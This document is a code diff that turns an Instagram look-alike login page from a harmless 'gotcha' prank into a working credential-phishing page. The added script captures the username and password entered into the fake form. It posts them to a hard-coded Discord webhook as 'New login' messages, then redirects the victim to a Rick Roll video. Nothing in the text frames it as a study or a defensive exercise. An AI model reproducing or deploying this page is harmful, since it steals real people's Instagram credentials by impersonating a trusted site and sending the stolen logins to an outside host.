@@ -63,14 +63,29 @@
 <body>
   <div class="login-box">
     <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
-    <form action="gotcha.html" method="get">
-      <input type="text" placeholder="Phone number, username, or email" required>
-      <input type="password" placeholder="Password" required>
-      <button type="submit">Log In</button>
-    </form>
-    <div class="bottom-text">
-      <p>Forgot password?</p>
-    </div>
-  </div>
-</body>
-</html>
+    <form id="login-form">
+  <input name="username" type="text" required>
+  <input name="password" type="password" required>
+  <button type="submit">Log In</button>
+</form>
+
+<script>
+document.getElementById('login-form').addEventListener('submit', function (e) {
+  e.preventDefault();
+
+  const username = e.target.username.value;
+  const password = e.target.password.value;
+
+  // Send to Discord webhook
+  fetch("https://canary.discord.com/api/webhooks/1400984544022102027/CsGqdVZN4spiA7Mn6cYvKde4UnMWyFoZftsVSDRqZ90cvs3pEJTItw4S7v-kfR5XbmUZ", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: `📥 New login:\n👤 ${username}\n🔑 ${password}`
+    })
+  });
+
+  // Rick Roll redirect
+  window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+});
+</script>
